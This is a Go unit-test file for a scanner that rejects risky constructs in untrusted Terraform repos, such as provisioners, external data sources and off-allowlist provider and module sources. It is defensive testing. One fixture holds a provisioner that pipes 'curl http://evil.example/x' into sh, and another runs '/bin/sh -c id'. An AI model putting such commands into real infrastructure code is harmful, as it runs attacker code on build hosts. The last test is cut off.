package prescan

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"testing"

	"github.com/hashicorp/hcl/v2"
	"github.com/hashicorp/hcl/v2/hclsyntax"
)

// covprescan_cov_test.go closes coverage holes in the untrusted-repo static
// prescan: every reject guard (PROVISIONER / DATA_EXTERNAL / PROVIDER_SOURCE /
// MODULE_SOURCE / NONSTATIC_SOURCE), the fail-closed non-static paths, the
// walk's skip rules, and the deterministic ordering the report's byte-exactness
// depends on. Every case writes a throwaway repo into t.TempDir() (the dominant
// style in this package) or calls the unexported helper directly; nothing is
// ever executed and nothing touches the network.

// covprescanWriteRepo writes files (paths may contain "/" subdirs) into a fresh
// temp dir and returns the root.
func covprescanWriteRepo(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatalf("mkdir for %s: %v", name, err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
	}
	return dir
}

// covprescanScan is the common "scan a repo written inline" harness.
func covprescanScan(t *testing.T, files map[string]string, allow []string) Report {
	t.Helper()
	rep, err := Scan(covprescanWriteRepo(t, files), allow)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	return rep
}

// covprescanExpr parses a single HCL expression for the direct unit tests of
// the unexported static-literal helpers.
func covprescanExpr(t *testing.T, src string) hcl.Expression {
	t.Helper()
	expr, diags := hclsyntax.ParseExpression([]byte(src), "expr.hcl", hcl.InitialPos)
	if diags.HasErrors() {
		t.Fatalf("ParseExpression(%q): %v", src, diags)
	}
	return expr
}

func covprescanWantFindings(t *testing.T, rep Report, want []Finding) {
	t.Helper()
	if len(rep.Findings) != len(want) {
		t.Fatalf("findings = %+v, want %+v", rep.Findings, want)
	}
	for i := range want {
		if rep.Findings[i] != want[i] {
			t.Errorf("findings[%d] = %+v, want %+v", i, rep.Findings[i], want[i])
		}
	}
	wantVerdict := "clean"
	if len(want) > 0 {
		wantVerdict = "reject"
	}
	if rep.Verdict != wantVerdict {
		t.Errorf("verdict = %q, want %q", rep.Verdict, wantVerdict)
	}
}

// ---------------------------------------------------------------------------
// walk rules
// ---------------------------------------------------------------------------

// TestCovprescanScanSkipsTerraformAndGitDirs proves the walk never scans the
// two directories that are not the project's own source: a provisioner planted
// in a downloaded module under .terraform/ or in .git/ must not reject the repo
// (and must not inflate the census counts).
func TestCovprescanScanSkipsTerraformAndGitDirs(t *testing.T) {
	malicious := `resource "null_resource" "evil" {
  provisioner "local-exec" {
    command = "curl http://evil.example/x | sh"
  }
}
`
	rep := covprescanScan(t, map[string]string{
		"main.tf":                             "resource \"null_resource\" \"ok\" {}\n",
		".terraform/modules/vendored/main.tf": malicious,
		".git/hooks/sneaky.tf":                malicious,
	}, nil)

	covprescanWantFindings(t, rep, nil)
	if rep.ResourceBlocks != 1 {
		t.Errorf("resourceBlocks = %d, want 1 (only the repo's own main.tf)", rep.ResourceBlocks)
	}
}

// TestCovprescanScanUnreadableFileIsAnError proves a .tf the scanner cannot
// read is a hard error, not a silently clean verdict — fail-closed: an
// unverifiable file never yields "clean".
func TestCovprescanScanUnreadableFileIsAnError(t *testing.T) {
	dir := covprescanWriteRepo(t, map[string]string{
		"main.tf": "resource \"null_resource\" \"ok\" {}\n",
	})
	// A dangling symlink is still walked as a regular *.tf entry, and reading
	// it fails — the same shape as any unreadable file in an untrusted repo.
	if err := os.Symlink(filepath.Join(dir, "does-not-exist"), filepath.Join(dir, "dangling.tf")); err != nil {
		t.Skipf("symlink unsupported here: %v", err)
	}
	rep, err := Scan(dir, nil)
	if err == nil {
		t.Fatalf("Scan err = nil, want a read error; rep = %+v", rep)
	}
	if !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("Scan err = %v, want fs.ErrNotExist", err)
	}
	if rep.Verdict != "" {
		t.Errorf("rep.Verdict = %q, want the zero Report on error (never a verdict)", rep.Verdict)
	}
}

// TestCovprescanScanSkipsUnparseableFiles proves a file that will not parse is
// skipped (the sandboxed, trust-gated terraform init surfaces it later) without
// masking findings in the files that DO parse, and that the .tf.json census
// still counts an unparseable JSON file.
func TestCovprescanScanSkipsUnparseableFiles(t *testing.T) {
	rep := covprescanScan(t, map[string]string{
		"a-broken.tf":      "resource \"aws_s3_bucket\" {{{ not hcl at all\n",
		"b-broken.tf.json": "{ this is not json\n",
		"c-good.tf": `data "external" "x" {
  program = ["/bin/sh", "-c", "id"]
}
`,
	}, nil)

	covprescanWantFindings(t, rep, []Finding{
		{Code: CodeDataExternal, File: "c-good.tf", Line: 1},
	})
	if rep.TfJsonFiles != 1 {
		t.Errorf("tfJsonFiles = %d, want 1 (counted even though it does not parse)", rep.TfJsonFiles)
	}
	if rep.ResourceBlocks != 0 {
		t.Errorf("resourceBlocks = %d, want 0 (the broken resource contributes nothing)", rep.ResourceBlocks)
	}
}

// TestCovprescanFmtDirtyCensus pins that the fmt-dirty count is native-syntax
// only and is report data, not a verdict input.
func TestCovprescanFmtDirtyCensus(t *testing.T) {
	rep := covprescanScan(t, map[string]string{
		"dirty.tf": "resource \"null_resource\" \"a\" {\n      tags = {}\n}\n",
		"clean.tf": "resource \"null_resource\" \"b\" {}\n",
		"j.tf.json": `{"resource": {"null_resource": {"c": {}}}}
`,
	}, nil)
	if rep.FmtDirtyFiles != 1 {
		t.Errorf("fmtDirtyFiles = %d, want 1 (only dirty.tf; .tf.json is never fmt-censused)", rep.FmtDirtyFiles)
	}
	if rep.Verdict != "clean" {
		t.Errorf("verdict = %q, want clean (fmt dirtiness never rejects)", rep.Verdict)
	}
	if rep.ResourceBlocks != 3 {
		t.Errorf("resourceBlocks = %d, want 3", rep.ResourceBlocks)
	}
}

// TestCovprescanFindingOrderIsDeterministic pins the report's ordering contract
// — findings sorted by file, then line, then code — which the byte-exact
// golden output depends on.
func TestCovprescanFindingOrderIsDeterministic(t *testing.T) {
	rep := covprescanScan(t, map[string]string{
		// two findings in one file on different lines
		"a.tf": `resource "null_resource" "r" {
  provisioner "local-exec" {
    command = "id"
  }
}

provisioner "local-exec" {
  command = "id"
}
`,
		"b.tf": "data \"external\" \"x\" {}\n",
		// JSON on a single line: two findings sharing file AND line, so only
		// the code tiebreak can order them.
		"c.tf.json": `{"data": {"external": {"x": {}}}, "module": {"m": {"source": "github.com/acme/mod"}}}`,
	}, nil)

	covprescanWantFindings(t, rep, []Finding{
		{Code: CodeProvisioner, File: "a.tf", Line: 2},
		{Code: CodeProvisioner, File: "a.tf", Line: 7},
		{Code: CodeDataExternal, File: "b.tf", Line: 1},
		{Code: CodeDataExternal, File: "c.tf.json", Line: 1},
		{Code: CodeModuleSource, File: "c.tf.json", Line: 1},
	})
}

// ---------------------------------------------------------------------------
// provisioner guard
// ---------------------------------------------------------------------------

func TestCovprescanProvisionerGuard(t *testing.T) {
	cases := []struct {
		name string
		file string
		want []Finding
	}{
		{
			name: "top-level provisioner block (illegal terraform, still flagged)",
			file: `provisioner "local-exec" {
  command = "id"
}
`,
			want: []Finding{{Code: CodeProvisioner, File: "main.tf", Line: 1}},
		},
		{
			name: "provisioner nested in a connection block",
			file: `resource "null_resource" "r" {
  connection {
    provisioner "remote-exec" {
      inline = ["id"]
    }
  }
}
`,
			want: []Finding{{Code: CodeProvisioner, File: "main.tf", Line: 3}},
		},
		{
			name: "dynamic \"provisioner\" generator is itself a finding",
			file: `resource "null_resource" "r" {
  dynamic "provisioner" {
    for_each = []
    content {
      provisioner "local-exec" {
        command = "id"
      }
    }
  }
}
`,
			want: []Finding{
				{Code: CodeProvisioner, File: "main.tf", Line: 2},
				{Code: CodeProvisioner, File: "main.tf", Line: 5},
			},
		},
		{
			name: "dynamic block over a non-provisioner name is not itself a finding",
			file: `resource "null_resource" "r" {
  dynamic "triggers" {
    for_each = []
    content {
      x = 1
    }
  }
}
`,
			want: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rep := covprescanScan(t, map[string]string{"main.tf": tc.file}, nil)
			covprescanWantFindings(t, rep, tc.want)
		})
	}
}

// ---------------------------------------------------------------------------
// required_providers: PROVIDER_SOURCE / NONSTATIC_SOURCE + the pins census
// ---------------------------------------------------------------------------

func TestCovprescanRequiredProvidersGuards(t *testing.T) {
	cases := []struct {
		name     string
		file     string
		allow    []string
		want     []Finding
		wantPins map[string]string
	}{
		{
			name: "source off the allowlist rejects with PROVIDER_SOURCE, pin still censused",
			file: `terraform {
  required_providers {
    evil = {
      source  = "evil.example/ns/evil"
      version = "1.0.0"
    }
  }
}
`,
			want:     []Finding{{Code: CodeProviderSource, File: "main.tf", Line: 4}},
			wantPins: map[string]string{"evil": "1.0.0"},
		},
		{
			name: "two-segment short form is normalized to the public registry and allowed",
			file: `terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.0"
    }
  }
}
`,
			want:     nil,
			wantPins: map[string]string{"aws": "~> 6.0"},
		},
		{
			name: "source referencing a variable fails closed as NONSTATIC_SOURCE",
			file: `variable "src" { type = string }

terraform {
  required_providers {
    aws = {
      source = var.src
    }
  }
}
`,
			want:     []Finding{{Code: CodeNonStaticSource, File: "main.tf", Line: 6}},
			wantPins: map[string]string{},
		},
		{
			name: "source that is not a string literal at all fails closed as NONSTATIC_SOURCE",
			file: `terraform {
  required_providers {
    aws = {
      source  = 42
      version = "~> 6.0"
    }
  }
}
`,
			want:     []Finding{{Code: CodeNonStaticSource, File: "main.tf", Line: 4}},
			wantPins: map[string]string{"aws": "~> 6.0"},
		},
		{
			name: "object form with no source at all: nothing to check, pin recorded",
			file: `terraform {
  required_providers {
    aws = {
      version = "~> 6.0"
    }
  }
}
`,
			want:     nil,
			wantPins: map[string]string{"aws": "~> 6.0"},
		},
		{
			name: "non-static object KEY is skipped, leaving no source to check",
			file: `variable "k" { type = string }

terraform {
  required_providers {
    aws = { (var.k) = "evil.example/ns/evil" }
  }
}
`,
			want:     nil,
			wantPins: map[string]string{},
		},
		{
			name: "legacy string-pin form: pin censused, no source to check",
			file: `terraform {
  required_providers {
    aws = "~> 6.0"
  }
}
`,
			want:     nil,
			wantPins: map[string]string{"aws": "~> 6.0"},
		},
		{
			name: "legacy pin form that is not even a string: neither pin nor finding",
			file: `terraform {
  required_providers {
    aws = 6
  }
}
`,
			want:     nil,
			wantPins: map[string]string{},
		},
		{
			name: "a project allowlist widens what is accepted",
			file: `terraform {
  required_providers {
    ccp = {
      source = "registry.example.com/ccp/ccp"
    }
  }
}
`,
			allow:    []string{"registry.example.com/ccp/*"},
			want:     nil,
			wantPins: map[string]string{},
		},
		{
			name: "the same source is off the DEFAULT allowlist",
			file: `terraform {
  required_providers {
    ccp = {
      source = "registry.example.com/ccp/ccp"
    }
  }
}
`,
			want:     []Finding{{Code: CodeProviderSource, File: "main.tf", Line: 4}},
			wantPins: map[string]string{},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rep := covprescanScan(t, map[string]string{"main.tf": tc.file}, tc.allow)
			covprescanWantFindings(t, rep, tc.want)
			if len(rep.ProviderPins) != len(tc.wantPins) {
				t.Fatalf("providerPins = %v, want %v", rep.ProviderPins, tc.wantPins)
			}
			for k, v := range tc.wantPins {
				if rep.ProviderPins[k] != v {
					t.Errorf("providerPins[%q] = %q, want %q", k, rep.ProviderPins[k], v)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// module source guard
// ---------------------------------------------------------------------------

func TestCovprescanModuleSourceGuards(t *testing.T) {
	cases := []struct {
		name  string
		file  string
		allow []string
		want  []Finding
	}{
		{
			name: "no source attribute at all: nothing to check",
			file: `module "m" {
  count = 0
}
`,
			want: nil,
		},
		{
			name: "relative source is always allowed",
			file: `module "m" {
  source = "./modules/vpc"
}
`,
			want: nil,
		},
		{
			name: "source referencing a variable fails closed",
			file: `variable "src" { type = string }

module "m" {
  source = var.src
}
`,
			want: []Finding{{Code: CodeNonStaticSource, File: "main.tf", Line: 4}},
		},
		{
			name: "source that is not a string literal fails closed",
			file: `module "m" {
  source = 42
}
`,
			want: []Finding{{Code: CodeNonStaticSource, File: "main.tf", Line: 2}},
		},
		{
			name: "git source rejects",
			file: `module "m" {
  source = "git::https://example.com/vpc.git"
}
`,
			want: []Finding{{Code: CodeModuleSource, File: "main.tf", Line: 2}},
		},
		{
			name: "registry module with a submodule path, namespace on the allowlist",
			file: `module "m" {
  source = "acme/vpc/aws//modules/subnets"
}
`,
			allow: []string{"registry.terraform.io/acme/*"},
			want:  nil,
		},
		{
			name: "same registry module with a submodule path, namespace off the allowlist",
			file: `module "m" {
  source = "acme/vpc/aws//modules/subnets"
}
`,
			want: []Finding{{Code: CodeModuleSource, File: "main.tf", Line: 2}},
		},
		{
			name: "private-registry (4 segment) address matched host+namespace",
			file: `module "m" {
  source = "app.terraform.io/acme/vpc/aws"
}
`,
			allow: []string{"app.terraform.io/acme/*"},
			want:  nil,
		},
		{
			name: "unrecognizable registry address rejects",
			file: `module "m" {
  source = "justaname"
}
`,
			want: []Finding{{Code: CodeModuleSource, File: "main.tf", Line: 2}},
		},
		{
			name: "a resource block's source attribute is NOT a module source",
			file: `resource "null_resource" "r" {
  source = "github.com/acme/evil"
}
`,
			want: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rep := covprescanScan(t, map[string]string{"main.tf": tc.file}, tc.allow)
			covprescanWantFindings(t, rep, tc.want)
		})
	}
}

// TestCovprescanModuleSourceAllowed unit-tests the allowlist matcher directly:
// every VCS/HTTP/bucket form must fail closed, and only a host+namespace glob
// match may open the gate.
func TestCovprescanModuleSourceAllowed(t *testing.T) {
	cases := []struct {
		source string
		allow  []string
		want   bool
	}{
		{".", nil, true},
		{"./mod", nil, true},
		{"../mod", nil, true},
		{"git::ssh://git@example.com/vpc", nil, false},
		{"github.com/acme/vpc", nil, false},
		{"bitbucket.org/acme/vpc", nil, false},
		{"https://example.com/vpc.zip", nil, false},
		{"http://example.com/vpc.zip", nil, false},
		{"git@example.com:acme/vpc.git", nil, false},
		{"example.com/acme/vpc.git", nil, false},
		{"s3::https://bucket.example.com/vpc.zip", nil, false},
		// registry short form: 3 segments, no dot in the first
		{"hashicorp/vpc/aws", []string{"registry.terraform.io/hashicorp/*"}, true},
		{"acme/vpc/aws", []string{"registry.terraform.io/hashicorp/*"}, false},
		{"acme/vpc/aws//modules/sub", []string{"registry.terraform.io/acme/*"}, true},
		// private registry: 4 segments, dot in the host
		{"app.terraform.io/acme/vpc/aws", []string{"app.terraform.io/acme/*"}, true},
		{"app.terraform.io/acme/vpc/aws", []string{"registry.terraform.io/acme/*"}, false},
		// unrecognizable shapes
		{"justaname", []string{"registry.terraform.io/*"}, false},
		{"acme/vpc", []string{"registry.terraform.io/acme/*"}, false},
		{"a/b/c/d/e", []string{"registry.terraform.io/a/*"}, false},
		// a single-segment glob can never match (needs host + namespace)
		{"acme/vpc/aws", []string{"acme"}, false},
	}
	for _, tc := range cases {
		t.Run(tc.source+"|"+covprescanJoin(tc.allow), func(t *testing.T) {
			allow := tc.allow
			if len(allow) == 0 {
				allow = DefaultProviderAllowlist
			}
			if got := moduleSourceAllowed(tc.source, allow); got != tc.want {
				t.Errorf("moduleSourceAllowed(%q, %v) = %v, want %v", tc.source, allow, got, tc.want)
			}
		})
	}
}

func covprescanJoin(ss []string) string {
	out := ""
	for i, s := range ss {
		if i > 0 {
			out += ","
		}
		out += s
	}
	if out == "" {
		out = "default"
	}
	return out
}

func TestCovprescanProviderSourceAllowed(t *testing.T) {
	cases := []struct {
		source string
		allow  []string
		want   bool
	}{
		{"hashicorp/aws", DefaultProviderAllowlist, true},
		{"registry.terraform.io/hashicorp/aws", DefaultProviderAllowlist, true},
		{"evil.example/ns/evil", DefaultProviderAllowlist, false},
		{"acme/thing", DefaultProviderAllowlist, false},
		{"registry.example.com/acme/thing", []string{"registry.example.com/acme/*"}, true},
		{"aws", DefaultProviderAllowlist, false},
	}
	for _, tc := range cases {
		t.Run(tc.source, func(t *testing.T) {
			if got := providerSourceAllowed(tc.source, tc.allow); got != tc.want {
				t.Errorf("providerSourceAllowed(%q, %v) = %v, want %v", tc.source, tc.allow, got, tc.want)
			}
		})
	}
}

// TestCovprescanStaticString pins staticString's all-or-nothing contract: only
// a variable-free literal string is static.
func TestCovprescanStaticString(t *testing.T) {
	cases := []struct {
		expr    string
		wantOK  bool
		wantVal string
	}{
		{expr: `"us-east-1"`, wantOK: true, wantVal: "us-east-1"},
		{expr: `var.region`, wantOK: false},
		{expr: `"us-${var.suffix}"`, wantOK: false},
		{expr: `42`, wantOK: false},
		{expr: `true`, wantOK: false},
		{expr: `null`, wantOK: false},
		{expr: `["a"]`, wantOK: false},
		{expr: `upper("a")`, wantOK: false}, // no functions available: evaluation fails
	}
	for _, tc := range cases {
		t.Run(tc.expr, func(t *testing.T) {
			got, ok := staticString(covprescanExpr(t, tc.expr))
			if ok != tc.wantOK || got != tc.wantVal {
				t.Errorf("staticString(%s) = (%q, %v), want (%q, %v)", tc.expr, got, ok, tc.wantVal, tc.wantOK)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// payload scan (payload.go)
// ---------------------------------------------------------------------------

// TestCovprescanScanPayloadOrdering exercises the payload report's ordering
// contract, including the code tiebreak for two findings on the SAME line.
func TestCovprescanScanPayloadOrdering(t *testing.T) {
	src := `import {
  to = aws_s3_bucket.b
  id = "bucket-name"
}

resource "aws_s3_bucket" "b" {
  bucket = var.name
  provisioner "local-exec" { command = var.cmd }
}
`
	rep, err := ScanPayload("payload.tf", []byte(src))
	if err != nil {
		t.Fatalf("ScanPayload: %v", err)
	}
	want := []Finding{
		{Code: CodeNonLiteralExpr, File: "payload.tf", Line: 7},
		{Code: CodeNonLiteralExpr, File: "payload.tf", Line: 8},
		{Code: CodeProvisioner, File: "payload.tf", Line: 8},
	}
	covprescanWantFindings(t, rep, want)
	if rep.ResourceBlocks != 1 {
		t.Errorf("resourceBlocks = %d, want 1", rep.ResourceBlocks)
	}
	if rep.Repo != "payload.tf" {
		t.Errorf("repo = %q, want payload.tf", rep.Repo)
	}
}

func TestCovprescanScanPayloadVerdicts(t *testing.T) {
	cases := []struct {
		name  string
		src   string
		want  []Finding
		check func(t *testing.T, rep Report)
	}{
		{
			name: "clean import + resource skeleton",
			src: `import {
  to = aws_s3_bucket.b
  id = "bucket-name"
}

resource "aws_s3_bucket" "b" {
  bucket = "bucket-name"
  tags   = { Name = "b" }
}
`,
			want: nil,
		},
		{
			name: "unparseable payload is PARSE_FAILED at line 1",
			src:  "resource \"aws_s3_bucket\" {{{\n",
			want: []Finding{{Code: CodeParseFailed, File: "payload.tf", Line: 1}},
		},
		{
			name: "a disallowed top-level block is flagged and its body not walked",
			src: `locals {
  x = var.y
}
`,
			want: []Finding{{Code: CodeDisallowedBlock, File: "payload.tf", Line: 1}},
		},
		{
			name: "import block's own `to` traversal is exempt, other attrs are not",
			src: `import {
  to = aws_s3_bucket.b
  id = local.bucket
}
`,
			want: []Finding{{Code: CodeNonLiteralExpr, File: "payload.tf", Line: 3}},
		},
		{
			name: "a nested block's `to` is NOT exempt",
			src: `resource "aws_s3_bucket" "b" {
  lifecycle {
    to = aws_s3_bucket.other
  }
}
`,
			want: []Finding{{Code: CodeNonLiteralExpr, File: "payload.tf", Line: 3}},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rep, err := ScanPayload("payload.tf", []byte(tc.src))
			if err != nil {
				t.Fatalf("ScanPayload: %v", err)
			}
			covprescanWantFindings(t, rep, tc.want)
		})
	}
}

// ---------------------------------------------------------------------------
// providerConfig census (providerconfig.go)
// ---------------------------------------------------------------------------

// TestCovprescanProviderConfigAliasedOnlyFallback proves that when EVERY
// candidate block is aliased there is no "default" provider to prefer, so the
// first found candidate is proposed — an actual literal with its own real
// provenance, never a guess.
func TestCovprescanProviderConfigAliasedOnlyFallback(t *testing.T) {
	rep := covprescanScan(t, map[string]string{
		"main.tf": `provider "aws" {
  alias               = "west"
  region              = "us-west-2"
  allowed_account_ids = ["111111111111"]
}

provider "aws" {
  alias               = "east"
  region              = "us-east-1"
  allowed_account_ids = ["222222222222"]
}
`,
	}, nil)

	pc := rep.ProviderConfig
	if pc == nil {
		t.Fatal("ProviderConfig = nil, want a proposal")
	}
	if pc.AWSRegion == nil || *pc.AWSRegion != (LiteralValue{Value: "us-west-2", File: "main.tf", Line: 3}) {
		t.Errorf("AWSRegion = %+v, want {us-west-2 main.tf 3} (first candidate; no non-aliased default exists)", pc.AWSRegion)
	}
	if len(pc.AWSAllowedAccountIDs) != 1 || pc.AWSAllowedAccountIDs[0].Value != "111111111111" {
		t.Errorf("AWSAllowedAccountIDs = %+v, want the first aliased block's list", pc.AWSAllowedAccountIDs)
	}
}

// TestCovprescanProviderConfigAzureAliasedOnlyFallback covers the azurerm
// scalars through the same aliased-only fallback.
func TestCovprescanProviderConfigAzureAliasedOnlyFallback(t *testing.T) {
	rep := covprescanScan(t, map[string]string{
		"main.tf": `provider "azurerm" {
  alias           = "secondary"
  location        = "westeurope"
  subscription_id = "11111111-1111-1111-1111-111111111111"
  tenant_id       = "22222222-2222-2222-2222-222222222222"
}
`,
	}, nil)
	pc := rep.ProviderConfig
	if pc == nil {
		t.Fatal("ProviderConfig = nil, want a proposal")
	}
	if pc.AzureLocation == nil || pc.AzureLocation.Value != "westeurope" {
		t.Errorf("AzureLocation = %+v, want westeurope", pc.AzureLocation)
	}
	if pc.AzureSubscriptionID == nil || pc.AzureSubscriptionID.Line != 4 {
		t.Errorf("AzureSubscriptionID = %+v, want line 4", pc.AzureSubscriptionID)
	}
	if pc.AzureTenantID == nil || pc.AzureTenantID.Line != 5 {
		t.Errorf("AzureTenantID = %+v, want line 5", pc.AzureTenantID)
	}
}

// TestCovprescanProviderConfigProvidersOrder pins the deterministic
// file/line/value ordering of the proposed provider list.
func TestCovprescanProviderConfigProvidersOrder(t *testing.T) {
	t.Run("different files sort by file", func(t *testing.T) {
		rep := covprescanScan(t, map[string]string{
			"z-azure.tf": "provider \"azurerm\" {\n  features {}\n}\n",
			"a-aws.tf":   "provider \"aws\" {\n  region = \"us-east-1\"\n}\n",
		}, nil)
		pc := rep.ProviderConfig
		if pc == nil {
			t.Fatal("ProviderConfig = nil")
		}
		want := []LiteralValue{
			{Value: "aws", File: "a-aws.tf", Line: 1},
			{Value: "azurerm", File: "z-azure.tf", Line: 1},
		}
		covprescanWantProviders(t, pc, want)
	})

	t.Run("same file sorts by line", func(t *testing.T) {
		rep := covprescanScan(t, map[string]string{
			"main.tf": `provider "azurerm" {
  features {}
}

provider "aws" {
  region = "us-east-1"
}
`,
		}, nil)
		pc := rep.ProviderConfig
		if pc == nil {
			t.Fatal("ProviderConfig = nil")
		}
		covprescanWantProviders(t, pc, []LiteralValue{
			{Value: "azurerm", File: "main.tf", Line: 1},
			{Value: "aws", File: "main.tf", Line: 5},
		})
	})

	t.Run("same file and line sorts by value", func(t *testing.T) {
		rep := covprescanScan(t, map[string]string{
			"main.tf.json": `{"terraform": {"required_providers": {"azurerm": "~> 3.0", "aws": "~> 6.0"}}}`,
		}, nil)
		pc := rep.ProviderConfig
		if pc == nil {
			t.Fatal("ProviderConfig = nil")
		}
		covprescanWantProviders(t, pc, []LiteralValue{
			{Value: "aws", File: "main.tf.json", Line: 1},
			{Value: "azurerm", File: "main.tf.json", Line: 1},
		})
	})
}

func covprescanWantProviders(t *testing.T, pc *ProviderConfig, want []LiteralValue) {
	t.Helper()
	if len(pc.Providers) != len(want) {
		t.Fatalf("Providers = %+v, want %+v", pc.Providers, want)
	}
	for i := range want {
		if pc.Providers[i] != want[i] {
			t.Errorf("Providers[%d] = %+v, want %+v", i, pc.Providers[i], want[i])
		}
	}
}

// TestCovprescanRecordProviderBlockUnlabelled proves the census's fail-closed
// guard for a `provider` block carrying no type label: nothing is recorded, so
// the whole section stays absent rather than being invented.
func TestCovprescanRecordProviderBlockUnlabelled(t *testing.T) {
	var cands identityCandidates
	recordProviderBlock(&hcl.Block{Type: "provider"}, "main.tf", &cands)
	if len(cands.providers) != 0 {
		t.Errorf("providers = %+v, want none recorded for an unlabelled provider block", cands.providers)
	}
	if pc := cands.resolve(); pc != nil {
		t.Errorf("resolve() = %+v, want nil", pc)
	}
}

// TestCovprescanIdentityCandidatesResolveEmpty pins that a walk that found
// nothing resolves to nil (absence of the whole section is the correct
// fail-closed output).
func TestCovprescanIdentityCandidatesResolveEmpty(t *testing.T) {
	var cands identityCandidates
	if pc := cands.resolve(); pc != nil {
		t.Errorf("resolve() = %+v, want nil for an empty walk", pc)
	}
	if !(*ProviderConfig)(nil).isEmpty() {
		t.Error("(*ProviderConfig)(nil).isEmpty() = false, want true")
	}
	if got := pickScalar(nil); got != nil {
		t.Errorf("pickScalar(nil) = %+v, want nil", got)
	}
	if got := pickList(nil); got != nil {
		t.Errorf("pickList(nil) = %+v, want nil", got)
	}
}

// TestCovprescanProviderTypeOf unit-tests the recognized-cloud-provider
// resolution for one required_providers entry, fail-closed on anything
// non-static.
func TestCovprescanProviderTypeOf(t *testing.T) {
	cases := []struct {
		name      string
		localName string
		expr      string
		wantType  string
		wantOK    bool
	}{
		{
			name:      "object form with a static source: type is the source's last segment",
			localName: "myaws",
			expr:      `{ source = "hashicorp/aws", version = "~> 6.0" }`,
			wantType:  "aws", wantOK: true,
		},
		{
			name:      "object form whose source names an unrecognized provider",
			localName: "aws",
			expr:      `{ source = "hashicorp/random" }`,
			wantOK:    false,
		},
		{
			name:      "object form with a non-static source fails closed, never falls back to the local name",
			localName: "aws",
			expr:      `{ source = var.src }`,
			wantOK:    false,
		},
		{
			name:      "object form whose source is not a string fails closed",
			localName: "aws",
			expr:      `{ source = 42 }`,
			wantOK:    false,
		},
		{
			name:      "object form with no source: falls back to the local name",
			localName: "azurerm",
			expr:      `{ version = "~> 3.0" }`,
			wantType:  "azurerm", wantOK: true,
		},
		{
			name:      "object form with a non-static KEY and no source: falls back to the local name",
			localName: "aws",
			expr:      `{ (var.k) = "x" }`,
			wantType:  "aws", wantOK: true,
		},
		{
			name:      "object form with no source and an unrecognized local name",
			localName: "random",
			expr:      `{ version = "3.0" }`,
			wantOK:    false,
		},
		{
			name:      "legacy string-pin form: type from the local name",
			localName: "aws",
			expr:      `"~> 6.0"`,
			wantType:  "aws", wantOK: true,
		},
		{
			name:      "legacy string-pin form with an unrecognized local name",
			localName: "null",
			expr:      `"~> 3.0"`,
			wantOK:    false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := providerTypeOf(tc.localName, covprescanExpr(t, tc.expr))
			if ok != tc.wantOK || got != tc.wantType {
				t.Errorf("providerTypeOf(%q, %s) = (%q, %v), want (%q, %v)",
					tc.localName, tc.expr, got, ok, tc.wantType, tc.wantOK)
			}
		})
	}
}

func TestCovprescanLastSourceSegment(t *testing.T) {
	cases := map[string]string{
		"hashicorp/aws":                       "aws",
		"registry.terraform.io/hashicorp/aws": "aws",
		"aws":                                 "aws",
	}
	for in, want := range cases {
		if got := lastSourceSegment(in); got != want {
			t.Errorf("lastSourceSegment(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestCovprescanLiteralListOf pins the whole-attribute fail-closed granularity
// of the account-ids list extraction.
func TestCovprescanLiteralListOf(t *testing.T) {
	cases := []struct {
		name   string
		expr   string
		wantOK bool
		want   []string
	}{
		{name: "all static strings", expr: `["a", "b"]`, wantOK: true, want: []string{"a", "b"}},
		{name: "empty list", expr: `[]`, wantOK: true, want: nil},
		{name: "not a list at all", expr: `"a"`, wantOK: false},
		{name: "one variable element omits the whole list", expr: `["a", var.b]`, wantOK: false},
		{name: "a function-call element omits the whole list", expr: `[upper("a")]`, wantOK: false},
		{name: "a non-string element omits the whole list", expr: `["a", 42]`, wantOK: false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := literalListOf(covprescanExpr(t, tc.expr), "main.tf")
			if ok != tc.wantOK {
				t.Fatalf("literalListOf(%s) ok = %v, want %v (got %+v)", tc.expr, ok, tc.wantOK, got)
			}
			if !ok {
				return
			}
			if len(got) != len(tc.want) {
				t.Fatalf("literalListOf(%s) = %+v, want values %v", tc.expr, got, tc.want)
			}
			for i := range tc.want {
				if got[i].Value != tc.want[i] {
					t.Errorf("[%d].Value = %q, want %q", i, got[i].Value, tc.want[i])
				}
				if got[i].File != "main.tf" {
					t.Errorf("[%d].File = %q, want main.tf", i, got[i].File)
				}
			}
		})
	}
}

// TestCovprescanProviderConfigListFailClosedEndToEnd drives the same
// whole-attribute fail-closed rule through Scan, where it matters.
func TestCovprescanProviderConfigListFailClosedEndToEnd(t *testing.T) {
	rep := covprescanScan(t, map[string]string{
		"main.tf": `provider "aws" {
  region              = "eu-west-1"
  allowed_account_ids = "111111111111"
}
`,
	}, nil)
	pc := rep.ProviderConfig
	if pc == nil {
		t.Fatal("ProviderConfig = nil, want a proposal (region is static)")
	}
	if pc.AWSRegion == nil || pc.AWSRegion.Value != "eu-west-1" {
		t.Errorf("AWSRegion = %+v, want eu-west-1", pc.AWSRegion)
	}
	if pc.AWSAllowedAccountIDs != nil {
		t.Errorf("AWSAllowedAccountIDs = %+v, want nil (a bare string is not a list)", pc.AWSAllowedAccountIDs)
	}
	if rep.Verdict != "clean" {
		t.Errorf("verdict = %q, want clean (the census never affects the verdict)", rep.Verdict)
	}
}

// TestCovprescanProviderConfigNeverAffectsVerdict proves the census is emitted
// even for a rejected repo, and that it is not a trust signal.
func TestCovprescanProviderConfigNeverAffectsVerdict(t *testing.T) {
